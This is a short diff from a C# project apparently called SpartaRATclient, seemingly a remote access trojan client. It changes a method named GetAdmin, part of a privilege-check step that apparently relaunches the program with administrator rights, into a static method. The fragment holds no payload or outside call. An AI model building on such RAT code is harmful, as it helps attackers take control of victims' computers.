@@ -13,7 +13,7 @@ namespace SpartaRATclient.Setup.PrivilegeCheck
 {
     public class AdminGet
     {
-        public bool GetAdmin()
+        public static bool GetAdmin()
         {
             ProcessStartInfo p = new ProcessStartInfo();
             p.UseShellExecute = true;
